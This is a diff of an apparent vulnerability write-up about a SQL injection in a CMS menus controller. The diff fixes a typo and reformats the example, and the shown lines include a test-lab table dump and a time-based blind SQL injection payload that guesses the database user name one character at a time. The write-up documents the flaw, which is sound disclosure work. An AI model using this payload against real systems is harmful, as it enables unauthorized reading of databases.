@@ -6,7 +6,7 @@ This SQL injection bug happened in the file `inc/lib/Control/Backend/menus.contr
 
 In this demo case, only use `select user()` to burte forcing the current DB user.
 
-Here is menus table in my Testing Lab maching:
+Here is menus table in my Testing Lab machine:
 
 ```
 mysql> select * from menus;
@@ -17,13 +17,13 @@ mysql> select * from menus;
 |  3 | test menu2 | tstMenu | 0      | 0   | cat  | 1     |       | NULL  |
 +----+------------+---------+--------+-----+------+-------+-------+-------+
 2 rows in set (0.00 sec)
-
 ```
 
 This is the SQL injection payload:
 
-`order[0][order`=1 and (select * from (select(if(ascii(substr((select user()),1,1))=114,sleep(3),0)))a) and `name]`
-
+```
+order[0][order`=1 and (select * from (select(if(ascii(substr((select user()),1,1))=114,sleep(3),0)))a) and `name]
+```
 
 This is the logic of SQL UPDATE statement after the payload injected:
 ```
